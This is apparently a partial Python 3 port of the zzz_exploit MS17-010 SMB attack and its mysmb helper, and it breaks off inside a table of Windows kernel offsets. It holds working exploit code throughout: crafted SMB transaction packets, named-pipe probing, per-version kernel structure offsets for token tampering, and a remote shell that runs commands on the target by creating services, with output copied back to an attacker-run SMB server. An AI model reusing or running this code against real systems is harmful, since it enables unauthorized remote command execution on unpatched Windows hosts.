#!/usr/bin/env python3


# block This is from the file mysmb.py (for the zzz_exploit) partially converted to python3. Tested in windows 7 and windows server 2003.
# If testing it in other operative systems give you any problem about combination of strings and bytes... probably you will have to finish the translation from python2 to python3.

import argparse
from impacket import smb, smbconnection
from impacket.dcerpc.v5 import transport, scmr
from struct import pack, unpack, unpack_from
from threading import Thread
import os
import cmd
import string
import random
import logging
import sys
import socket
import time


def getNTStatus(self):
    return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
setattr(smb.NewSMBPacket, "getNTStatus", getNTStatus)

############# SMB_COM_TRANSACTION_SECONDARY (0x26))
class SMBTransactionSecondary_Parameters(smb.SMBCommand_Parameters):
    structure = (
        ('TotalParameterCount','<H=0'),
        ('TotalDataCount','<H'),
        ('ParameterCount','<H=0'),
        ('ParameterOffset','<H=0'),
        ('ParameterDisplacement','<H=0'),
        ('DataCount','<H'),
        ('DataOffset','<H'),
        ('DataDisplacement','<H=0'),
)

# Note: impacket-0.9.15 struct has no ParameterDisplacement
############# SMB_COM_TRANSACTION2_SECONDARY (0x33))
class SMBTransaction2Secondary_Parameters(smb.SMBCommand_Parameters):
    structure = (
        ('TotalParameterCount','<H=0'),
        ('TotalDataCount','<H'),
        ('ParameterCount','<H=0'),
        ('ParameterOffset','<H=0'),
        ('ParameterDisplacement','<H=0'),
        ('DataCount','<H'),
        ('DataOffset','<H'),
        ('DataDisplacement','<H=0'),
        ('FID','<H=0'),
)

############# SMB_COM_NT_TRANSACTION_SECONDARY (0xA1))
class SMBNTTransactionSecondary_Parameters(smb.SMBCommand_Parameters):
    structure = (
        ('Reserved1','3s=""'),
        ('TotalParameterCount','<L'),
        ('TotalDataCount','<L'),
        ('ParameterCount','<L'),
        ('ParameterOffset','<L'),
        ('ParameterDisplacement','<L=0'),
        ('DataCount','<L'),
        ('DataOffset','<L'),
        ('DataDisplacement','<L=0'),
        ('Reserved2','<B=0'),
    )


def _put_trans_data(transCmd, parameters, data, noPad=False):
    # have to init offset before calling len())
    transCmd['Parameters']['ParameterOffset'] = 0
    transCmd['Parameters']['DataOffset'] = 0

    # SMB header: 32 bytes
    # WordCount: 1 bytes
    # ByteCount: 2 bytes
    # Note: Setup length is included when len(param) is called
    offset = 32 + 1 + len(transCmd['Parameters']) + 2

    transData = b''
    if len(parameters):
        padLen = 0 if noPad else (4 - offset % 4 ) % 4
        transCmd['Parameters']['ParameterOffset'] = offset + padLen
        #transData = (b'\x00' * padLen) + parameters
        if isinstance(parameters, str):
            transData += (b'\x00' * padLen) + parameters.encode('utf-8')  # Convertir str a bytes
        elif isinstance(parameters, bytes):
            transData += (b'\x00' * padLen) + parameters  # Data ya es bytes
        offset += padLen + len(parameters)

    if len(data):
        padLen = 0 if noPad else (4 - offset % 4 ) % 4
        transCmd['Parameters']['DataOffset'] = offset + padLen
        # Verificar tipo de data y convertir si es necesario
        if isinstance(data, str):
            transData += (b'\x00' * padLen) + data.encode('utf-8')  # Convertir str a bytes
        elif isinstance(data, bytes):
            transData += (b'\x00' * padLen) + data  # Data ya es bytes

    transCmd['Data'] = transData


origin_NewSMBPacket_addCommand = getattr(smb.NewSMBPacket, "addCommand")
login_MaxBufferSize = 61440
def NewSMBPacket_addCommand_hook_login(self, command):
    # restore NewSMBPacket.addCommand
    setattr(smb.NewSMBPacket, "addCommand", origin_NewSMBPacket_addCommand)

    if isinstance(command['Parameters'], smb.SMBSessionSetupAndX_Extended_Parameters):
        command['Parameters']['MaxBufferSize'] = login_MaxBufferSize
    elif isinstance(command['Parameters'], smb.SMBSessionSetupAndX_Parameters):
        command['Parameters']['MaxBuffer'] = login_MaxBufferSize

    # call original one
    origin_NewSMBPacket_addCommand(self, command)

def _setup_login_packet_hook(maxBufferSize):
    # setup hook for next NewSMBPacket.addCommand if maxBufferSize is not None
    if maxBufferSize is not None:
        global login_MaxBufferSize
        login_MaxBufferSize = maxBufferSize
        setattr(smb.NewSMBPacket, "addCommand", NewSMBPacket_addCommand_hook_login)


class MYSMB(smb.SMB):
    def __init__(self, remote_host, use_ntlmv2=True, timeout=8):
        self.__use_ntlmv2 = use_ntlmv2
        self._default_tid = 0
        self._pid = os.getpid() & 0xffff
        self._last_mid = random.randint(1000, 20000)
        if 0x4000 <= self._last_mid <= 0x4110:
            self._last_mid += 0x120
        self._pkt_flags2 = 0
        self._last_tid = 0  # last tid from connect_tree()
        self._last_fid = 0  # last fid from nt_create_andx()
        self._smbConn = None
        smb.SMB.__init__(self, remote_host, remote_host, timeout=timeout)

    def find_named_pipe(self, firstOnly=True):
        pipes_file = '/usr/share/metasploit-framework/data/wordlists/named_pipes.txt'
        try:
            with open(pipes_file) as f:
                pipes = [ x.strip() for x in f.readlines()]
        except IOError as e:
            print("[-] Could not open {}, trying hardcoded values".format(pipes_file))
            pipes = [ 'netlogon', 'lsarpc', 'samr', 'browser', 'spoolss', 'atsvc', 'DAV RPC SERVICE', 'epmapper', 'eventlog', 'InitShutdown', 'keysvc', 'lsass', 'LSM_API_service', 'ntsvcs', 'plugplay', 'protected_storage', 'router', 'SapiServerPipeS-1-5-5-0-70123', 'scerpc', 'srvsvc', 'tapsrv', 'trkwks', 'W32TIME_ALT', 'wkssvc','PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER', 'db2remotecmd' ]
        tid = self.tree_connect_andx('\\\\'+self.get_remote_host()+'\\'+'IPC$')
        found_pipes = []
        for pipe in pipes:
            try:
                fid = self.nt_create_andx(tid, pipe)
                self.close(tid, fid)
                found_pipes.append(pipe)
                print("[+] Found pipe '{}'".format(pipe))
                if firstOnly:
                    break
            except smb.SessionError as e:
                pass
        self.disconnect_tree(tid)
        if len(found_pipes) > 0:
            return found_pipes[0]
        else:
            return None

    def set_pid(self, pid):
        self._pid = pid

    def get_pid(self):
        return self._pid

    def set_last_mid(self, mid):
        self._last_mid = mid

    def next_mid(self):
        self._last_mid += random.randint(1, 20)
        if 0x4000 <= self._last_mid <= 0x4110:
            self._last_mid += 0x120
        return self._last_mid

    def get_smbconnection(self):
        if self._smbConn is None:
            self.smbConn = smbconnection.SMBConnection(self.get_remote_host(), self.get_remote_host(), existingConnection=self)
        return self.smbConn

    def get_dce_rpc(self, named_pipe):
        smbConn = self.get_smbconnection()
        rpctransport = transport.SMBTransport(self.get_remote_host(), self.get_remote_host(), filename='\\'+named_pipe, smb_connection=smbConn)
        return rpctransport.get_dce_rpc()

    # override SMB.neg_session() to allow forcing ntlm authentication
    def neg_session(self, extended_security=True, negPacket=None):
        smb.SMB.neg_session(self, extended_security=self.__use_ntlmv2, negPacket=negPacket)

    # to use any login method, SMB must not be used from multiple thread
    def login(self, user, password, domain='', lmhash='', nthash='', ntlm_fallback=True, maxBufferSize=None):
        _setup_login_packet_hook(maxBufferSize)
        smb.SMB.login(self, user, password, domain, lmhash, nthash)

    def login_standard(self, user, password, domain='', lmhash='', nthash='', maxBufferSize=None):
        _setup_login_packet_hook(maxBufferSize)
        smb.SMB.login_standard(self, user, password, domain, lmhash, nthash)

    def login_extended(self, user, password, domain='', lmhash='', nthash='', use_ntlmv2=True, maxBufferSize=None):
        _setup_login_packet_hook(maxBufferSize)
        smb.SMB.login_extended(self, user, password, domain, lmhash, nthash, use_ntlmv2)

    def connect_tree(self, path, password=None, service=smb.SERVICE_ANY, smb_packet=None):
        self._last_tid = smb.SMB.tree_connect_andx(self, path, password, service, smb_packet)
        return self._last_tid

    def get_last_tid(self):
        return self._last_tid

    def nt_create_andx(self, tid, filename, smb_packet=None, cmd=None, shareAccessMode=smb.FILE_SHARE_READ|smb.FILE_SHARE_WRITE, disposition=smb.FILE_OPEN, accessMask=0x2019f):
        self._last_fid = smb.SMB.nt_create_andx(self, tid, filename, smb_packet, cmd, shareAccessMode, disposition, accessMask)
        return self._last_fid

    def get_last_fid(self):
        return self._last_fid

    def set_default_tid(self, tid):
        self._default_tid = tid

    def set_pkt_flags2(self, flags):
        self._pkt_flags2 = flags

    def send_echo(self, data):
        pkt = smb.NewSMBPacket()
        pkt['Tid'] = self._default_tid

        transCommand = smb.SMBCommand(smb.SMB.SMB_COM_ECHO)
        transCommand['Parameters'] = smb.SMBEcho_Parameters()
        transCommand['Data'] = smb.SMBEcho_Data()

        transCommand['Parameters']['EchoCount'] = 1
        transCommand['Data']['Data'] = data
        pkt.addCommand(transCommand)

        self.sendSMB(pkt)
        return self.recvSMB()

    def do_write_andx_raw_pipe(self, fid, data, mid=None, pid=None, tid=None):
        writeAndX = smb.SMBCommand(smb.SMB.SMB_COM_WRITE_ANDX)
        writeAndX['Parameters'] = smb.SMBWriteAndX_Parameters_Short()
        writeAndX['Parameters']['Fid'] = fid
        writeAndX['Parameters']['Offset'] = 0
        writeAndX['Parameters']['WriteMode'] = 4  # SMB_WMODE_WRITE_RAW_NAMED_PIPE
        writeAndX['Parameters']['Remaining'] = 12345  # can be any. raw named pipe does not use it
        writeAndX['Parameters']['DataLength'] = len(data)
        writeAndX['Parameters']['DataOffset'] = 32 + len(writeAndX['Parameters']) + 1 + 2 + 1 # WordCount(1), ByteCount(2), Padding(1)
        #writeAndX['Data'] = b'\x00' + data
        if isinstance(data, str):
            writeAndX['Data'] = b'\x00' + data.encode('utf-8')  # Convertir str a bytes
        elif isinstance(data, bytes):
            writeAndX['Data'] = b'\x00' + data # Data ya es bytes

        self.send_raw(self.create_smb_packet(writeAndX, mid, pid, tid))
        return self.recvSMB()

    def create_smb_packet(self, smbReq, mid=None, pid=None, tid=None):
        if mid is None:
            mid = self.next_mid()

        pkt = smb.NewSMBPacket()
        pkt.addCommand(smbReq)
        pkt['Tid'] = self._default_tid if tid is None else tid
        pkt['Uid'] = self._uid
        pkt['Pid'] = self._pid if pid is None else pid
        pkt['Mid'] = mid
        flags1, flags2 = self.get_flags()
        pkt['Flags1'] = flags1
        pkt['Flags2'] = self._pkt_flags2 if self._pkt_flags2 != 0 else flags2

        if self._SignatureEnabled:
            pkt['Flags2'] |= smb.SMB.FLAGS2_SMB_SECURITY_SIGNATURE
            self.signSMB(pkt, self._SigningSessionKey, self._SigningChallengeResponse)

        req = pkt.getData()
        return b'\x00'*2 + pack('>H', len(req)) + req

    def send_raw(self, data):
        self.get_socket().send(data)

    def create_trans_packet(self, setup, param='', data='', mid=None, maxSetupCount=None, totalParameterCount=None, totalDataCount=None, maxParameterCount=None, maxDataCount=None, pid=None, tid=None, noPad=False):
        if maxSetupCount is None:
            maxSetupCount = len(setup)
        if totalParameterCount is None:
            totalParameterCount = len(param)
        if totalDataCount is None:
            totalDataCount = len(data)
        if maxParameterCount is None:
            maxParameterCount = totalParameterCount
        if maxDataCount is None:
            maxDataCount = totalDataCount
        transCmd = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION)
        transCmd['Parameters'] = smb.SMBTransaction_Parameters()
        transCmd['Parameters']['TotalParameterCount'] = totalParameterCount
        transCmd['Parameters']['TotalDataCount'] = totalDataCount
        transCmd['Parameters']['MaxParameterCount'] = maxParameterCount
        transCmd['Parameters']['MaxDataCount'] = maxDataCount
        transCmd['Parameters']['MaxSetupCount'] = maxSetupCount
        transCmd['Parameters']['Flags'] = 0
        transCmd['Parameters']['Timeout'] = 0xffffffff
        transCmd['Parameters']['ParameterCount'] = len(param)
        transCmd['Parameters']['DataCount'] = len(data)
        transCmd['Parameters']['Setup'] = setup
        _put_trans_data(transCmd, param, data, noPad)
        return self.create_smb_packet(transCmd, mid, pid, tid)

    def send_trans(self, setup, param='', data='', mid=None, maxSetupCount=None, totalParameterCount=None, totalDataCount=None, maxParameterCount=None, maxDataCount=None, pid=None, tid=None, noPad=False):
        self.send_raw(self.create_trans_packet(setup, param, data, mid, maxSetupCount, totalParameterCount, totalDataCount, maxParameterCount, maxDataCount, pid, tid, noPad))
        return self.recvSMB()

    def create_trans_secondary_packet(self, mid, param='', paramDisplacement=0, data='', dataDisplacement=0, pid=None, tid=None, noPad=False):
        transCmd = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION_SECONDARY)
        transCmd['Parameters'] = SMBTransactionSecondary_Parameters()
        transCmd['Parameters']['TotalParameterCount'] = len(param)
        transCmd['Parameters']['TotalDataCount'] = len(data)
        transCmd['Parameters']['ParameterCount'] = len(param)
        transCmd['Parameters']['ParameterDisplacement'] = paramDisplacement
        transCmd['Parameters']['DataCount'] = len(data)
        transCmd['Parameters']['DataDisplacement'] = dataDisplacement

        _put_trans_data(transCmd, param, data, noPad)
        return self.create_smb_packet(transCmd, mid, pid, tid)

    def send_trans_secondary(self, mid, param='', paramDisplacement=0, data='', dataDisplacement=0, pid=None, tid=None, noPad=False):
        self.send_raw(self.create_trans_secondary_packet(mid, param, paramDisplacement, data, dataDisplacement, pid, tid, noPad))

    def create_trans2_packet(self, setup, param='', data='', mid=None, maxSetupCount=None, totalParameterCount=None, totalDataCount=None, maxParameterCount=None, maxDataCount=None, pid=None, tid=None, noPad=False):
        if maxSetupCount is None:
            maxSetupCount = len(setup)
        if totalParameterCount is None:
            totalParameterCount = len(param)
        if totalDataCount is None:
            totalDataCount = len(data)
        if maxParameterCount is None:
            maxParameterCount = totalParameterCount
        if maxDataCount is None:
            maxDataCount = totalDataCount
        transCmd = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2)
        transCmd['Parameters'] = smb.SMBTransaction2_Parameters()
        transCmd['Parameters']['TotalParameterCount'] = totalParameterCount
        transCmd['Parameters']['TotalDataCount'] = totalDataCount
        transCmd['Parameters']['MaxParameterCount'] = maxParameterCount
        transCmd['Parameters']['MaxDataCount'] = maxDataCount
        transCmd['Parameters']['MaxSetupCount'] = len(setup)
        transCmd['Parameters']['Flags'] = 0
        transCmd['Parameters']['Timeout'] = 0xffffffff
        transCmd['Parameters']['ParameterCount'] = len(param)
        transCmd['Parameters']['DataCount'] = len(data)
        transCmd['Parameters']['Setup'] = setup
        _put_trans_data(transCmd, param, data, noPad)
        return self.create_smb_packet(transCmd, mid, pid, tid)

    def create_trans2_secondary_packet(self, mid, param='', paramDisplacement=0, data='', dataDisplacement=0, pid=None, tid=None, noPad=False):
        transCmd = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
        transCmd['Parameters'] = SMBTransaction2Secondary_Parameters()
        transCmd['Parameters']['TotalParameterCount'] = len(param)
        transCmd['Parameters']['TotalDataCount'] = len(data)
        transCmd['Parameters']['ParameterCount'] = len(param)
        transCmd['Parameters']['ParameterDisplacement'] = paramDisplacement
        transCmd['Parameters']['DataCount'] = len(data)
        transCmd['Parameters']['DataDisplacement'] = dataDisplacement

        _put_trans_data(transCmd, param, data, noPad)
        return self.create_smb_packet(transCmd, mid, pid, tid)

    def send_trans2_secondary(self, mid, param='', paramDisplacement=0, data='', dataDisplacement=0, pid=None, tid=None, noPad=False):
        self.send_raw(self.create_trans2_secondary_packet(mid, param, paramDisplacement, data, dataDisplacement, pid, tid, noPad))

    def create_nt_trans_packet(self, function, setup='', param='', data='', mid=None, maxSetupCount=None, totalParameterCount=None, totalDataCount=None, maxParameterCount=None, maxDataCount=None, pid=None, tid=None, noPad=False):
        if maxSetupCount is None:
            maxSetupCount = len(setup)
        if totalParameterCount is None:
            totalParameterCount = len(param)
        if totalDataCount is None:
            totalDataCount = len(data)
        if maxParameterCount is None:
            maxParameterCount = totalParameterCount
        if maxDataCount is None:
            maxDataCount = totalDataCount
        transCmd = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
        transCmd['Parameters'] = smb.SMBNTTransaction_Parameters()
        transCmd['Parameters']['MaxSetupCount'] = maxSetupCount
        transCmd['Parameters']['TotalParameterCount'] = totalParameterCount
        transCmd['Parameters']['TotalDataCount'] = totalDataCount
        transCmd['Parameters']['MaxParameterCount'] = maxParameterCount
        transCmd['Parameters']['MaxDataCount'] = maxDataCount
        transCmd['Parameters']['ParameterCount'] = len(param)
        transCmd['Parameters']['DataCount'] = len(data)
        transCmd['Parameters']['Function'] = function
        transCmd['Parameters']['Setup'] = setup
        _put_trans_data(transCmd, param, data, noPad)
        return self.create_smb_packet(transCmd, mid, pid, tid)

    def send_nt_trans(self, function, setup='', param='', data='', mid=None, maxSetupCount=None, totalParameterCount=None, totalDataCount=None, maxParameterCount=None, maxDataCount=None, pid=None, tid=None, noPad=False):
        self.send_raw(self.create_nt_trans_packet(function, setup, param, data, mid, maxSetupCount, totalParameterCount, totalDataCount, maxParameterCount, maxDataCount, pid, tid, noPad))
        return self.recvSMB()

    def create_nt_trans_secondary_packet(self, mid, param='', paramDisplacement=0, data='', dataDisplacement=0, pid=None, tid=None, noPad=False):
        transCmd = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT_SECONDARY)
        transCmd['Parameters'] = SMBNTTransactionSecondary_Parameters()
        transCmd['Parameters']['TotalParameterCount'] = len(param)
        transCmd['Parameters']['TotalDataCount'] = len(data)
        transCmd['Parameters']['ParameterCount'] = len(param)
        transCmd['Parameters']['ParameterDisplacement'] = paramDisplacement
        transCmd['Parameters']['DataCount'] = len(data)
        transCmd['Parameters']['DataDisplacement'] = dataDisplacement
        _put_trans_data(transCmd, param, data, noPad)
        return self.create_smb_packet(transCmd, mid, pid, tid)

    def send_nt_trans_secondary(self, mid, param='', paramDisplacement=0, data='', dataDisplacement=0, pid=None, tid=None, noPad=False):
        self.send_raw(self.create_nt_trans_secondary_packet(mid, param, paramDisplacement, data, dataDisplacement, pid, tid, noPad))

    def recv_transaction_data(self, mid, minLen): # ESTA FUNCION HA SIDO REVISADA Y CAMBIADA POR CHATGPT
        data = b''  # Asegurarse de que data sea binario
        while len(data) < minLen:
            recvPkt = self.recvSMB()
            if recvPkt['Mid'] != mid:
                continue
            # Asegurarse de que smb.SMBCommand pueda manejar recvPkt['Data'][0] correctamente
            resp = smb.SMBCommand(recvPkt['Data'][0])
            # Asegurarse de que resp['Data'][1:] sea bytes
            data += resp['Data'][1:]  # Skip padding
        return data

class RemoteShell(cmd.Cmd):
    def __init__(self, share, rpc, mode, serviceName):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__mode = mode
        self.__outputFilename = ''.join([random.choice(string.ascii_letters) for _ in range(4)])
        self.__output = '\\\\127.0.0.1\\{}\\{}'.format(self.__share,self.__outputFilename)
        self.__batchFile = '%TEMP%\\{}.bat'.format(''.join([random.choice(string.ascii_letters) for _ in range(4)]))
        self.__outputBuffer = b''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c '
        self.__serviceName = serviceName
        self.__rpc = rpc
        self.intro = '[!] Dropping a semi-interactive shell (remember to escape special chars with ^) \n[!] Executing interactive programs will hang shell!'
        self.__scmr = rpc.get_dce_rpc('svcctl')

        try:
            self.__scmr.connect()
        except Exception as e:
            logging.critical(str(e))
            sys.exit(1)

        s = rpc.get_smbconnection()

        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)
        if mode == 'SERVER':
            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp['lpScHandle']
        self.transferClient = rpc.get_smbconnection()
        self.do_cd('')

    def finish(self):
        # Just in case the service is still created
        try:
           self.__scmr = self.__rpc.get_dce_rpc()
           self.__scmr.connect()
           self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
           resp = scmr.hROpenSCManagerW(self.__scmr)
           self.__scHandle = resp['lpScHandle']
           resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
           service = resp['lpServiceHandle']
           scmr.hRDeleteService(self.__scmr, service)
           scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
           scmr.hRCloseServiceHandle(self.__scmr, service)
        except scmr.DCERPCException:
           pass

    def do_shell(self, s):
        os.system(s)

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        # We just can't CD or maintain track of the target dir.
        if len(s) > 0:
            logging.error("You can't CD under SMBEXEC. Use full paths.")

        self.execute_remote('cd ' )
        if len(self.__outputBuffer) > 0:
            # Stripping CR/LF
            self.prompt = self.__outputBuffer.decode().replace('\r\n','') + '>'
            self.__outputBuffer = b''

    def do_CD(self, s):
        return self.do_cd(s)

    def default(self, line):
        if line != '':
            self.send_data(line)

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__mode == 'SHARE':
            self.transferClient.getFile(self.__share, self.__outputFilename, output_callback)
            self.transferClient.deleteFile(self.__share, self.__outputFilename)
        else:
            fd = open(SMBSERVER_DIR + '/' + self.__outputFilename,'r')
            output_callback(fd.read())
            fd.close()
            os.unlink(SMBSERVER_DIR + '/' + self.__outputFilename)

    def execute_remote(self, data):
        to_batch = '{} echo {} ^> {} 2^>^&1 > {}'.format(self.__shell, data, self.__output, self.__batchFile)
        command = '{} & {} {}'.format(to_batch, self.__shell, self.__batchFile)
        if self.__mode == 'SERVER':
            command += ' & ' + self.__copyBack
        command = '{} & del {}'.format(command, self.__batchFile )
        logging.debug('Executing %s' % command)
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName,
                                        lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
        service = resp['lpServiceHandle']

        try:
            scmr.hRStartServiceW(self.__scmr, service)
        except:
            pass
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output()
        #print(self.__outputBuffer)

    def send_data(self, data):
        self.execute_remote(data)
        print(self.__outputBuffer.decode())
        self.__outputBuffer = b''

class SMBServer(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.smb = None

    def cleanup_server(self):
        logging.info('Cleaning up..')
        try:
            os.unlink(SMBSERVER_DIR + '/smb.log')
        except:
            pass
        os.rmdir(SMBSERVER_DIR)

    def run(self):
        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file',SMBSERVER_DIR + '/smb.log')
        smbConfig.set('global','credentials_file','')

        # Let's add a dummy share
        smbConfig.add_section(DUMMY_SHARE)
        smbConfig.set(DUMMY_SHARE,'comment','')
        smbConfig.set(DUMMY_SHARE,'read only','no')
        smbConfig.set(DUMMY_SHARE,'share type','0')
        smbConfig.set(DUMMY_SHARE,'path',SMBSERVER_DIR)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path')

        self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
        logging.info('Creating tmp directory')
        try:
            os.mkdir(SMBSERVER_DIR)
        except Exception as e:
            logging.critical(str(e))
            pass
        logging.info('Setting up SMB Server')
        self.smb.processConfigFile()
        logging.info('Ready to listen...')
        try:
            self.smb.serve_forever()
        except:
            pass

    def stop(self):
        self.cleanup_server()
        self.smb.socket.close()
        self.smb.server_close()
        self._Thread__stop()







######################################################################################################################################################################################################
######################################################################################################################################################################################################
######################################################################################################################################################################################################



# This bloc is the original zzz_exploit.py partially converted to python3. Tested in windows 7 and windows server 2003 (working).
# If it gives you any problem like combination of strings and bytes, it is because is not totally translated yet to python3.


# GLOBAL VARIABLES NEEDED
special_mid = 0
extra_last_mid = 0


# ATTACK FUNCTION
def smb_attack(ip_address, command_bolean, transfer_bolean, route_file_input, route_file_output, command):
    USERNAME = ''
    PASSWORD = ''


    WIN7_64_SESSION_INFO = {
        'SESSION_SECCTX_OFFSET': 0xa0,
        'SESSION_ISNULL_OFFSET': 0xba,
        'FAKE_SECCTX': pack('<IIQQIIB', 0x28022a, 1, 0, 0, 2, 0, 1),
        'SECCTX_SIZE': 0x28,
    }

    WIN7_32_SESSION_INFO = {
        'SESSION_SECCTX_OFFSET': 0x80,
        'SESSION_ISNULL_OFFSET': 0x96,
        'FAKE_SECCTX': pack('<IIIIIIB', 0x1c022a, 1, 0, 0, 2, 0, 1),
        'SECCTX_SIZE': 0x1c,
    }

    WIN8_64_SESSION_INFO = {
        'SESSION_SECCTX_OFFSET': 0xb0,
        'SESSION_ISNULL_OFFSET': 0xca,
        'FAKE_SECCTX': pack('<IIQQQQIIB', 0x38022a, 1, 0, 0, 0, 0, 2, 0, 1),
        'SECCTX_SIZE': 0x38,
    }

    WIN8_32_SESSION_INFO = {
        'SESSION_SECCTX_OFFSET': 0x88,
        'SESSION_ISNULL_OFFSET': 0x9e,
        'FAKE_SECCTX': pack('<IIIIIIIIB', 0x24022a, 1, 0, 0, 0, 0, 2, 0, 1),
        'SECCTX_SIZE': 0x24,
    }

    WIN2K3_64_SESSION_INFO = {
        'SESSION_ISNULL_OFFSET': 0xba,
        'SESSION_SECCTX_OFFSET': 0xa0, 
        'SECCTX_PCTXTHANDLE_OFFSET': 0x10,  
        'PCTXTHANDLE_TOKEN_OFFSET': 0x40,
        'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
        'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
    }

    WIN2K3_32_SESSION_INFO = {
        'SESSION_ISNULL_OFFSET': 0x96,
        'SESSION_SECCTX_OFFSET': 0x80,  
        'SECCTX_PCTXTHANDLE_OFFSET': 0xc,  
        'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
        'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
        'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
    }

    # win xp
    WINXP_32_SESSION_INFO = {
        'SESSION_ISNULL_OFFSET': 0x94,
        'SESSION_SECCTX_OFFSET': 0x84, 
        'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
        'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
        'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
        'TOKEN_USER_GROUP_CNT_OFFSET_SP0_SP1': 0x40,
        'TOKEN_USER_GROUP_ADDR_OFFSET_SP0_SP1': 0x5c
    }

    WIN2K_32_SESSION_INFO = {
        'SESSION_ISNULL_OFFSET': 0x94,
        'SESSION_SECCTX_OFFSET': 0x84,  
        'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
        'TOKEN_USER_GROUP_CNT_OFFSET': 0x3c,
        'TOKEN_USER_GROUP_ADDR_OFFSET': 0x58,
    }

    WIN7_32_TRANS_INFO = {
        'TRANS_SIZE': 0xa0, 
        'TRANS_FLINK_OFFSET': 0x18,
        'TRANS_INPARAM_OFFSET': 0x40,
        'TRANS_OUTPARAM_OFFSET': 0x44,
        'TRANS_INDATA_OFFSET': 0x48,
        'TRANS_OUTDATA_OFFSET': 0x4c,
        'TRANS_PARAMCNT_OFFSET': 0x58,
        'TRANS_TOTALPARAMCNT_OFFSET': 0x5c,
        'TRANS_FUNCTION_OFFSET': 0x72,
        'TRANS_MID_OFFSET': 0x80,
    }

    WIN7_64_TRANS_INFO = {
        'TRANS_SIZE': 0xf8, 
        'TRANS_FLINK_OFFSET': 0x28,
        'TRANS_INPARAM_OFFSET': 0x70,
        'TRANS_OUTPARAM_OFFSET': 0x78,
        'TRANS_INDATA_OFFSET': 0x80,
        'TRANS_OUTDATA_OFFSET': 0x88,
        'TRANS_PARAMCNT_OFFSET': 0x98,
        'TRANS_TOTALPARAMCNT_OFFSET': 0x9c,
        'TRANS_FUNCTION_OFFSET': 0xb2,
        'TRANS_MID_OFFSET': 0xc0,
    }

    WIN5_32_TRANS_INFO = {
        'TRANS_SIZE': 0x98, 
        'TRANS_FLINK_OFFSET': 0x18,
        'TRANS_INPARAM_OFFSET': 0x3c,
        'TRANS_OUTPARAM_OFFSET': 0x40,
        'TRANS_INDATA_OFFSET': 0x44,
        'TRANS_OUTDATA_OFFSET': 0x48,
        'TRANS_PARAMCNT_OFFSET': 0x54,
        'TRANS_TOTALPARAMCNT_OFFSET': 0x58,
        'TRANS_FUNCTION_OFFSET': 0x6e,
        'TRANS_PID_OFFSET': 0x78,
        'TRANS_MID_OFFSET': 0x7c,
    }

    WIN5_64_TRANS_INFO = {
        'TRANS_SIZE': 0xe0, 
        'TRANS_FLINK_OFFSET': 0x28,
        'TRANS_INPARAM_OFFSET': 0x68,
        'TRANS_OUTPARAM_OFFSET': 0x70,
        'TRANS_INDATA_OFFSET': 0x78,
        'TRANS_OUTDATA_OFFSET': 0x80,
        'TRANS_PARAMCNT_OFFSET': 0x90,
        'TRANS_TOTALPARAMCNT_OFFSET': 0x94,
        'TRANS_FUNCTION_OFFSET': 0xaa,
        'TRANS_PID_OFFSET': 0xb4,
        'TRANS_MID_OFFSET': 0xb8,
    }

    X86_INFO = {
        'ARCH': 'x86',
        'PTR_SIZE': 4,
        'PTR_FMT': 'I',
        'FRAG_TAG_OFFSET': 12,
        'POOL_ALIGN': 8,
        'SRV_BUFHDR_SIZE': 8,
    }

    X64_INFO = {
        'ARCH': 'x64',
        'PTR_SIZE': 8,
        'PTR_FMT': 'Q',
        'FRAG_TAG_OFFSET': 0x14,
        'POOL_ALIGN': 0x10,
        'SRV_BUFHDR_SIZE': 0x10,
    }

    def merge_dicts(*dict_args):
        result = {}
        for dictionary in dict_args:
            result.update(dictionary)
        return result


    OS_ARCH_INFO = {
        'WIN7': {
            'x86': merge_dicts(X86_INFO, WIN7_32_TRANS_INFO, WIN7_32_SESSION_INFO),
            'x64': merge_dicts(X64_INFO, WIN7_64_TRANS_INFO, WIN7_64_SESSION_INFO),
        },
        'WIN8': {
